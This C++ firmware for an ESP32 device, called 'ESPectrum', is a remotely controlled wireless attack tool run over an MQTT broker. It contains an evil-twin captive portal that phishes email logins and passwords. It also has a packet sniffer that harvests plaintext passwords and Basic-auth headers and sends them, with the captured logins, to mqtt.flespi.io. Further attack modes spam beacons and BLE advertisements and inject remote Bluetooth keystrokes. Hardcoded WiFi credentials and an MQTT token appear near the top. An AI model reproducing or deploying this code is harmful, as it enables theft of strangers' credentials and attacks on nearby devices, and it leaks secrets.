/*
 * ESPectrum - ESP32 Firmware
 * Features: MQTT Control (Flespi), File System (LittleFS), Hardware Tools
 * Dependencies: PubSubClient, ArduinoJson, NimBLE-Arduino
 */

#include <WiFi.h>
#include <PubSubClient.h>
#include <ArduinoJson.h>
#include <LittleFS.h>
#include <NimBLEDevice.h>
#include <esp_wifi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <BleKeyboard.h>

// ================= CONFIGURATION =================
const char* ssid     = "Vpn";
const char* password = "@@2021##";

// Flespi MQTT
const char* mqtt_server = "mqtt.flespi.io";
const int mqtt_port     = 1883;
const char* mqtt_token  = "AS2wNDPtK056fOhQAQdcEOdx3ceJ0dPmEioS81O0q2ytBvxW8FM5uIcQ3m3C4FOc";

// Topics
const char* topic_data    = "espectrum/data";
const char* topic_cmd     = "espectrum/command";
const char* topic_chat    = "espectrum/chat";

// Buffer Size
#define MQTT_BUFFER_SIZE 4096

// ================= GLOBALS =================
WiFiClient espClient;
PubSubClient client(espClient);
DNSServer dnsServer;
WebServer webServer(80);
BleKeyboard bleKeyboard("ESPectrum-Keyboard", "Google", 100);

// Persistence across Deep Sleep
RTC_DATA_ATTR int lastSleepDuration = 0;

// Radio Management
enum RadioMode { RADIO_WIFI_STA, RADIO_WIFI_AP, RADIO_BLE };
RadioMode currentRadio = RADIO_WIFI_STA;

void switchRadioMode(RadioMode newMode);
void stopWiFi();
void stopBLE();

// Async Task Flags
bool triggerWifiScan = false;
bool triggerBleScan = false;
bool triggerFileList = false;
bool sniffingEnabled = false;

// File Op
String fileToRead = "";
String fileToDelete = "";

// Attack State
enum Mode { MODE_IDLE, MODE_ATTACK_WIFI, MODE_ATTACK_BLE, MODE_EVIL_TWIN, MODE_SNIFFER };
Mode currentMode = MODE_IDLE;
String attackType = "";
unsigned long attackEndTime = 0;

// Sniffer Data
// Sniffer Data
unsigned long lastPacketSent = 0;
const int packetInterval = 100; // Send max 1 packet per 100ms via MQTT

// Sensor Timing
unsigned long lastSensorUpdate = 0;
const unsigned long sensorInterval = 200; // Faster updates for reactive touch animations

// ================= SNIFFER CALLBACK =================
void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (currentMode != MODE_SNIFFER) return;

  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  int len = pkt->rx_ctrl.sig_len;
  byte* payload = pkt->payload;

  // 1. IDS Check: Look for Deauth (0xC0) or Disassociate (0xD0) frames
  if (payload[0] == 0xC0 || payload[0] == 0xD0) {
      StaticJsonDocument<256> alert;
      alert["type"] = "sensor_data";
      alert["alert"] = "DEAUTH DETECTED!";
      String output;
      serializeJson(alert, output);
      client.publish(topic_data, output.c_str());
  }

  // 2. sampled packet reporting to Traffic Matrix
  unsigned long now = millis();
  if (now - lastPacketSent > packetInterval) {
    lastPacketSent = now;
    
    // Check for HTTP Plaintext Passwords (POST / Content-Type: application/x-www-form-urlencoded)
    // Very simplified check: search for "pass", "pwd", "user", "login" in payload
    String payloadStr = "";
    for(int i=0; i<len && i<128; i++) {
        if(payload[i] >= 32 && payload[i] <= 126) payloadStr += (char)payload[i];
    }
    
    if (payloadStr.indexOf("password=") != -1 || payloadStr.indexOf("Authorization: Basic") != -1) {
        StaticJsonDocument<512> sheep;
        sheep["type"] = "sheep_data";
        sheep["content"] = payloadStr;
        sheep["ip"] = "SNIFFED";
        String out;
        serializeJson(sheep, out);
        client.publish(topic_data, out.c_str());
    }

    StaticJsonDocument<512> doc;
    doc["type"] = "packet_data";
    
    JsonObject data = doc.createNestedObject("data");
    data["rssi"] = pkt->rx_ctrl.rssi;
    data["len"] = len;
    
    // Simple Frame Type Identification
    if (payload[0] == 0x80) data["type"] = "BEACON";
    else if (payload[0] == 0xC0) data["type"] = "DEAUTH";
    else if ((payload[0] & 0x0C) == 0x04) data["type"] = "CONTROL";
    else if ((payload[0] & 0x0C) == 0x08) data["type"] = "DATA";
    else data["type"] = "MGMT";

    // Extract MACs (Simplified)
    char macStr[18];
    sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", payload[10], payload[11], payload[12], payload[13], payload[14], payload[15]);
    data["from"] = String(macStr);
    sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", payload[4], payload[5], payload[6], payload[7], payload[8], payload[9]);
    data["to"] = String(macStr);

    String output;
    serializeJson(doc, output);
    client.publish(topic_data, output.c_str());
  }
}

// ================= SETUP =================
void setup() {
  Serial.begin(115200);
  pinMode(2, OUTPUT); // Built-in LED
  
  // Init File System
  if (!LittleFS.begin(true)) {
    Serial.println("LittleFS Mount Failed");
  } else {
    Serial.println("LittleFS Mounted");
  }

  // 1. Init WiFi (Priority)
  setupWiFi();
  
  // 2. Init BLE (Secondary)
  delay(2000); // Radio stabilization
  NimBLEDevice::init("ESPectrum-Node");

  client.setServer(mqtt_server, mqtt_port);
  client.setCallback(callback);
  client.setBufferSize(MQTT_BUFFER_SIZE);
  
  // Check Wakeup Reason
  esp_sleep_wakeup_cause_t wakeup_reason = esp_sleep_get_wakeup_cause();
  if (wakeup_reason == ESP_SLEEP_WAKEUP_TIMER) {
      Serial.println("Wakeup caused by timer");
      // Handle delayed notification after MQTT connects
  }

  // Evil Twin Web Server Routes
  // Evil Twin Web Server Routes & Captive Portal Handling
  webServer.on("/", HTTP_ANY, []() {
      webServer.send(200, "text/html", "<h1>Login to Free WiFi</h1><form action='/login' method='POST'><input type='text' name='user' placeholder='Email'><br><input type='password' name='pass' placeholder='Password'><br><input type='submit' value='Login'></form>");
  });

  webServer.on("/login", HTTP_POST, []() {
      String user = webServer.arg("user");
      String pass = webServer.arg("pass");
      Serial.println("CREDENTIALS: " + user + ":" + pass);
      
      File f = LittleFS.open("/captured.txt", "a");
      f.println(user + ":" + pass);
      f.close();
      
      webServer.send(200, "text/html", "<h1>Connecting... please wait.</h1><script>setTimeout(function(){window.location.href='http://google.com';}, 3000);</script>");
  });

  // Catch-all for Captive Portal (Android/iOS checks)
  webServer.onNotFound([]() {
      String host = webServer.hostHeader();
      // If the request is NOT for our IP, redirect to it
      if (host != WiFi.softAPIP().toString()) {
          webServer.sendHeader("Location", String("http://") + WiFi.softAPIP().toString(), true);
          webServer.send(302, "text/plain", "");
      } else {
          // If it IS our IP but unknown path, show login
          webServer.send(200, "text/html", "<h1>Login to Free WiFi</h1><form action='/login' method='POST'><input type='text' name='user' placeholder='Email'><br><input type='password' name='pass' placeholder='Password'><br><input type='submit' value='Login'></form>");
      }
  });

  // Specific Android/Apple Captive Portal endpoints
  webServer.on("/generate_204", [](){ webServer.send(200, "text/html", "<h1>Login</h1><meta http-equiv='refresh' content='0;url=/' />"); });
  webServer.on("/hotspot-detect.html", [](){ webServer.send(200, "text/html", "<h1>Login</h1><meta http-equiv='refresh' content='0;url=/' />"); });
}

// ================= LOOP =================
void loop() {
  unsigned long now = millis();

  // Mode Handling
  if (currentMode == MODE_EVIL_TWIN) {
     if (now > attackEndTime) {
         stopAttack();
     } else {
         dnsServer.processNextRequest();
         webServer.handleClient();
     }
     return;
  }
  
  if (currentMode == MODE_SNIFFER) {
      if (!client.connected()) reconnect();
      client.loop(); // Keep MQTT alive for stop command
      return; 
  }

  if (currentMode != MODE_IDLE && currentMode != MODE_EVIL_TWIN) {
    if (now > attackEndTime) {
      stopAttack();
    } else {
       performAttackLoop();
    }
  }

  // Standard MQTT connection
  if (currentMode == MODE_IDLE) {
      if (!client.connected()) reconnect();
      client.loop();
      
      if (triggerWifiScan) { performWifiScan(); triggerWifiScan = false; }
      if (triggerBleScan) { performBleScan(); triggerBleScan = false; }
      if (triggerFileList) { sendFileList(); triggerFileList = false; }
      if (fileToRead != "") { sendFileContent(fileToRead); fileToRead = ""; }
      if (fileToDelete != "") { 
          LittleFS.remove(fileToDelete); 
          client.publish(topic_data, "{\"type\":\"status\",\"msg\":\"File Deleted\"}");
          sendFileList();
          fileToDelete = ""; 
      }
    
      if (now - lastSensorUpdate > sensorInterval) {
          lastSensorUpdate = now;
          sendSensorData();
      }
  }
}

// ================= MQTT CALLBACK =================
void callback(char* topic, byte* payload, unsigned int length) {
  // Convert payload to string
  // Note: payload is not null-terminated by default in some libraries, but ArduinoJson handles it
  
  StaticJsonDocument<2048> doc; // Incoming command doc
  DeserializationError error = deserializeJson(doc, payload, length);

  if (error) return;

  if (String(topic) == topic_chat) {
      Serial.printf("CHAT: %s\n", doc["text"].as<const char*>());
      // Handle incoming chat (e.g. flash LED)
      return;
  }

  const char* type = doc["type"];
  const char* action = doc["action"];

  Serial.printf("CMD: %s / %s\n", type, action);

  if (strcmp(type, "command") == 0) {
    if (strcmp(action, "scan_wifi") == 0) triggerWifiScan = true;
    else if (strcmp(action, "scan_ble") == 0) triggerBleScan = true;
    else if (strcmp(action, "stop_attack") == 0) stopAttack();
    else if (strcmp(action, "start_sniffing") == 0) {
        currentMode = MODE_SNIFFER;
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
        client.publish(topic_data, "{\"type\":\"status\",\"msg\":\"Sniffer Started\"}");
    }
    else if (strcmp(action, "stop_sniffing") == 0) {
        esp_wifi_set_promiscuous(false);
        currentMode = MODE_IDLE;
        client.publish(topic_data, "{\"type\":\"status\",\"msg\":\"Sniffer Stopped\"}");
    }
    else if (strcmp(action, "ping") == 0) {
        client.publish(topic_data, "{\"type\":\"status\",\"msg\":\"PONG\"}");
    }
    else if (strcmp(action, "deep_sleep") == 0) {
        int duration = doc["params"]["duration"] | 30;
        
        StaticJsonDocument<128> report;
        report["type"] = "status";
        report["msg"] = "Entering Sleep Mode";
        String out;
        serializeJson(report, out);
        client.publish(topic_data, out.c_str());
        
        Serial.printf("Entering Deep Sleep for %d seconds\n", duration);
        lastSleepDuration = duration; // Save to RTC memory
        client.loop(); // Flush MQTT
        delay(1000);   // Give MQTT time to send
        
        esp_sleep_enable_timer_wakeup(duration * 1000000ULL);
        esp_deep_sleep_start();
    }
    else if (strcmp(action, "start_attack") == 0) {
      attackType = doc["params"]["type"].as<String>();
      int duration = doc["params"]["duration"] | 10;
      attackEndTime = millis() + (duration * 1000);
      
      if (attackType == "rickroll") currentMode = MODE_ATTACK_WIFI;
      else if (attackType == "sourapple") currentMode = MODE_ATTACK_BLE;
      else if (attackType == "eviltwin") {
          currentMode = MODE_EVIL_TWIN;
          startEvilTwin();
      }
    }
    // Phase 5: Hardware Tools
    else if (strcmp(action, "ble_hid_key") == 0) {
        if (currentRadio != RADIO_BLE) switchRadioMode(RADIO_BLE);
        if (!bleKeyboard.isConnected()) {
            bleKeyboard.begin();
            client.publish(topic_data, "{\"type\":\"status\",\"msg\":\"BLE Keyboard Starting...\"}");
        }
        int key = doc["params"]["key"];
        bleKeyboard.write(key);
        client.publish(topic_data, "{\"type\":\"status\",\"msg\":\"Key Sent\"}");
    }
    else if (strcmp(action, "ble_hid_type") == 0) {
        if (currentRadio != RADIO_BLE) switchRadioMode(RADIO_BLE);
        if (!bleKeyboard.isConnected()) {
            bleKeyboard.begin();
        }
        const char* text = doc["params"]["text"];
        bleKeyboard.print(text);
        client.publish(topic_data, "{\"type\":\"status\",\"msg\":\"Text Typed\"}");
    }
    else if (strcmp(action, "ir_blast_power") == 0) {
        client.publish(topic_data, "{\"type\":\"status\",\"msg\":\"IR Blast (Needs IRremote Lib)\"}");
        // Logic: irsend.sendSony(0xa90, 12); (Example)
    }
    else if (strcmp(action, "toggle_led") == 0) {
        bool state = doc["params"]["state"];
        // Ensure explicit HIGH/LOW
        digitalWrite(2, state ? HIGH : LOW);
        client.publish(topic_data, state ? "{\"type\":\"status\",\"msg\":\"LED ON\"}" : "{\"type\":\"status\",\"msg\":\"LED OFF\"}");
    }
  }
  else if (strcmp(type, "file_cmd") == 0) {
    if (strcmp(action, "list") == 0) triggerFileList = true;
    else if (strcmp(action, "read") == 0) fileToRead = doc["path"].as<String>();
    else if (strcmp(action, "delete") == 0) fileToDelete = doc["path"].as<String>();
    else if (strcmp(action, "write") == 0) {
      // Direct Write (Small files)
      String path = doc["path"];
      String content = doc["content"];
      if (!path.startsWith("/")) path = "/" + path;
      File f = LittleFS.open(path, "w");
      if (f) { f.print(content); f.close(); client.publish(topic_data, "{\"type\":\"status\",\"msg\":\"File Saved\"}"); triggerFileList = true; }
    }
  }
}

void startEvilTwin() {
    Serial.println("STARTING EVIL TWIN AP");
    WiFi.disconnect();
    WiFi.mode(WIFI_AP);
    // Start DNS Server (Redirect ALL traffic to us)
  dnsServer.start(53, "*", WiFi.softAPIP());
  
  // Start Web Server
  webServer.begin();
  
  Serial.println("Evil Twin Started. Waiting for victims...");
}

void stopAttack() {
   Serial.println("STOPPING ATTACK - RECONNECTING");
   currentMode = MODE_IDLE;
   if (attackType == "eviltwin") {
       dnsServer.stop();
       webServer.stop();
   }
   // Reconnect to station
   setupWiFi();
   // MQTT will reconnect in loop
   
   // Phase 5: Broadcast captured credentials to Wall of Sheep
   if (LittleFS.exists("/captured.txt")) {
       File f = LittleFS.open("/captured.txt", "r");
       while(f.available()){
           String line = f.readStringUntil('\n');
           if (line.length() > 0) {
               StaticJsonDocument<256> sheep;
               sheep["type"] = "sheep_data";
               sheep["content"] = line;
               sheep["ip"] = "CAPTURED";
               String out;
               serializeJson(sheep, out);
               client.publish(topic_data, out.c_str());
           }
       }
       f.close();
   }
}

// ================= TASKS =================

void performWifiScan() {
  Serial.println("Scanning WiFi...");
  int n = WiFi.scanNetworks();
  
  DynamicJsonDocument doc(4096); // Dynamic for potentially large list
  doc["type"] = "scan_result_wifi";
  JsonArray array = doc.createNestedArray("networks");
  
  // Limit to top 20 to fit in buffer
  int limit = (n > 20) ? 20 : n;
  
  for (int i = 0; i < limit; ++i) {
    JsonObject net = array.createNestedObject();
    net["ssid"] = WiFi.SSID(i);
    net["rssi"] = WiFi.RSSI(i);
    net["ch"] = WiFi.channel(i);
    net["auth"] = (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) ? "OPEN" : "SECURE";
  }
  
  String output;
  serializeJson(doc, output);
  client.publish(topic_data, output.c_str());
  WiFi.scanDelete();
}

void performBleScan() {
  Serial.println("Preparing BLE Scan (Switching Radio)...");
  switchRadioMode(RADIO_BLE);
  
  NimBLEScan* pScan = NimBLEDevice::getScan();
  pScan->clearResults();
  pScan->start(3, false); // 3 seconds scan
  
  NimBLEScanResults results = pScan->getResults();
  int count = results.getCount();
  if (count > 20) count = 20;

  // We must return to WiFi to send results
  switchRadioMode(RADIO_WIFI_STA);
  reconnect(); // Force sync reconnection

  DynamicJsonDocument doc(4096);
  doc["type"] = "scan_result_ble";
  JsonArray array = doc.createNestedArray("devices");

  for(int i=0; i<count; i++) {
    auto device = results.getDevice(i);
    JsonObject dev = array.createNestedObject();
    dev["name"] = device->getName().c_str();
    dev["addr"] = device->getAddress().toString().c_str();
    dev["rssi"] = device->getRSSI();
  }
  
  String output;
  serializeJson(doc, output);
  client.publish(topic_data, output.c_str());
  pScan->clearResults();
}

void sendFileList() {
  File root = LittleFS.open("/");
  if (!root || !root.isDirectory()) return;

  DynamicJsonDocument doc(4096);
  doc["type"] = "file_list";
  JsonArray array = doc.createNestedArray("data");

  File file = root.openNextFile();
  while(file) {
    JsonObject f = array.createNestedObject();
    String name = String(file.name());
    if(!name.startsWith("/")) name = "/" + name;
    
    f["name"] = name;
    f["size"] = file.size();
    file = root.openNextFile();
  }

  String output;
  serializeJson(doc, output);
  client.publish(topic_data, output.c_str());
}

void sendFileContent(String path) {
  if (!path.startsWith("/")) path = "/" + path;
  if (!LittleFS.exists(path)) return;

  File f = LittleFS.open(path, "r");
  if (!f) return;

  // Caution: Large files will crash JSON buffer
  // We limit to 2KB for now
  size_t size = f.size();
  if (size > 2048) {
      client.publish(topic_data, "{\"type\":\"error\",\"msg\":\"File too large for MQTT\"}");
      f.close();
      return;
  }

  String content = f.readString();
  f.close();

  DynamicJsonDocument doc(4096);
  doc["type"] = "file_content";
  doc["path"] = path;
  doc["content"] = content;

  String output;
  serializeJson(doc, output);
  client.publish(topic_data, output.c_str());
}

const char* rickroll_ssids[] = {
  "1-Never gonna give you up",
  "2-Never gonna let you down",
  "3-Never gonna run around",
  "4-and desert you",
  "5-Never gonna make you cry",
  "6-Never gonna say goodbye",
  "7-Never gonna tell a lie",
  "8-and hurt you"
};

// Full 802.11 Beacon Packet Structure
void sendBeacon(const char* ssid) {
  // Randomize Source MAC (BSSID) so phones treat them as unique networks
  uint8_t mac[6];
  for(int i=0; i<6; i++) mac[i] = random(256);
  mac[0] = 0x02; // Locally administered bit

  uint8_t packet[128] = { 
    0x80, 0x00,             // Frame Control (Beacon)
    0x00, 0x00,             // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination (Broadcast)
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], // Source (BSSID) - Randomized!
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], // BSSID (Same as Source)
    0x00, 0x00,             // Sequence Control
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
    0x64, 0x00,             // Beacon Interval (100ms)
    0x01, 0x04              // Capability Info (ESS privacy)
  };

  int offset = 36;

  // 1. Tag: SSID
  packet[offset++] = 0;
  packet[offset++] = strlen(ssid);
  for(int i=0; i<strlen(ssid); i++) packet[offset++] = ssid[i];

  // 2. Tag: Supported Rates (Mandatory for phones to see it)
  packet[offset++] = 1;
  packet[offset++] = 8;
  packet[offset++] = 0x82; packet[offset++] = 0x84; 
  packet[offset++] = 0x8b; packet[offset++] = 0x96;
  packet[offset++] = 0x24; packet[offset++] = 0x30;
  packet[offset++] = 0x48; packet[offset++] = 0x6c;

  // 3. Tag: DS Parameter Set (Channel 1)
  packet[offset++] = 3;
  packet[offset++] = 1;
  packet[offset++] = 1;

  // Transmit on current interface
  esp_wifi_80211_tx(WIFI_IF_AP, packet, offset, true);
}

void performAttackLoop() {
  if (attackType == "rickroll") {
     static int ssid_idx = 0;
     sendBeacon(rickroll_ssids[ssid_idx]);
     ssid_idx = (ssid_idx + 1) % 8;
     delay(100); // Slower delay to let phones process beacons
  }
  else if (attackType == "sourapple") {
     NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
     pAdvertising->start();
     delay(50);
     pAdvertising->stop();
  }
}

void sendSensorData() {
  StaticJsonDocument<512> doc;
  doc["type"] = "sensor_data";
  doc["timestamp"] = millis() / 1000;
  
  // Touch - Only using T8 (GPIO33) and T9 (GPIO32) to avoid conflicts
  JsonArray touch = doc.createNestedArray("touch");
  int touchPins[] = {33, 32};
  for (int i = 0; i < 2; i++) {
    touch.add(touchRead(touchPins[i]));
  }
  

  // Temp
  #ifdef SOC_TEMP_SENSOR_SUPPORTED
    doc["temp"] = temperatureRead();
  #else
    doc["temp"] = 40 + (millis() % 1000) / 100.0;
  #endif
  
  doc["rssi"] = WiFi.RSSI();
  doc["uptime"] = millis() / 1000;

  String output;
  serializeJson(doc, output);
  client.publish(topic_data, output.c_str()); // Telemetry -> topic_data (app filters by type)
}

// ================= RADIO MANAGEMENT =================

void switchRadioMode(RadioMode newMode) {
  if (currentRadio == newMode) return;
  
  Serial.printf("Switching Radio: %d -> %d\n", currentRadio, newMode);
  
  // Clean up current mode
  if (currentRadio == RADIO_WIFI_STA || currentRadio == RADIO_WIFI_AP) {
      // If we are moving TO BLE, we must stop WiFi
      if (newMode == RADIO_BLE) stopWiFi();
  } else if (currentRadio == RADIO_BLE) {
      stopBLE();
  }
  
  // Initialize new mode
  if (newMode == RADIO_WIFI_STA) {
      setupWiFi();
  } else if (newMode == RADIO_BLE) {
      // NimBLE already initialized in setup, but we could re-init if we de-inited
      Serial.println("BLE Mode Active");
  }
  
  currentRadio = newMode;
}

void stopWiFi() {
  Serial.println("Stopping WiFi...");
  client.disconnect();
  WiFi.disconnect(true);
  WiFi.mode(WIFI_OFF);
  delay(100);
}

void stopBLE() {
  Serial.println("Stopping BLE...");
  NimBLEDevice::getScan()->stop();
  NimBLEDevice::getAdvertising()->stop();
  // We don't fully deinit as it's expensive, just ensure no active tx/rx
}


void setupWiFi() {
  Serial.printf("Connecting to WiFi: %s\n", ssid);
  WiFi.mode(WIFI_STA);
  WiFi.setAutoReconnect(true);
  WiFi.disconnect(); // Clear previous states
  delay(100);
  
  WiFi.begin(ssid, password);
  
  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 40) { // 20 second timeout
    delay(500);
    Serial.print(".");
    attempts++;
    
    if (attempts % 10 == 0) {
        Serial.printf("\nStatus: %d\n", WiFi.status());
        // Status 4 is WL_CONNECT_FAILED, 6 is WL_DISCONNECTED
        if (WiFi.status() == 4) {
            Serial.println("Connect Failed. Retrying...");
            WiFi.begin(ssid, password);
        }
    }
  }

  if (WiFi.status() == WL_CONNECTED) {
      Serial.println("\nWiFi Connected!");
      Serial.print("IP Address: ");
      Serial.println(WiFi.localIP());
  } else {
      Serial.println("\nWiFi Connection Failed! Starting in Offline Mode.");
  }
}

void reconnect() {
  while (!client.connected()) {
    String clientId = "ESPectrum-" + String(random(0xffff), HEX);
    // Connect with Flespi Token as username
    if (client.connect(clientId.c_str(), mqtt_token, "")) {
      Serial.println("MQTT Connected");
      client.subscribe(topic_cmd);
      client.publish("espectrum/status", "{\"status\":\"online\"}");
      
      // Notify if we just woke up from sleep
      esp_sleep_wakeup_cause_t wakeup_reason = esp_sleep_get_wakeup_cause();
      if (wakeup_reason == ESP_SLEEP_WAKEUP_TIMER) {
          StaticJsonDocument<256> wakeup;
          wakeup["type"] = "system_event";
          wakeup["event"] = "wakeup";
          JsonObject data = wakeup.createNestedObject("data");
          data["wakeup_reason"] = "Timer";
          data["sleep_duration"] = lastSleepDuration;
          
          String out;
          serializeJson(wakeup, out);
          client.publish(topic_data, out.c_str());
          Serial.println("Sent Wakeup Report");
      }
    } else {
      delay(5000);
    }
  }
}
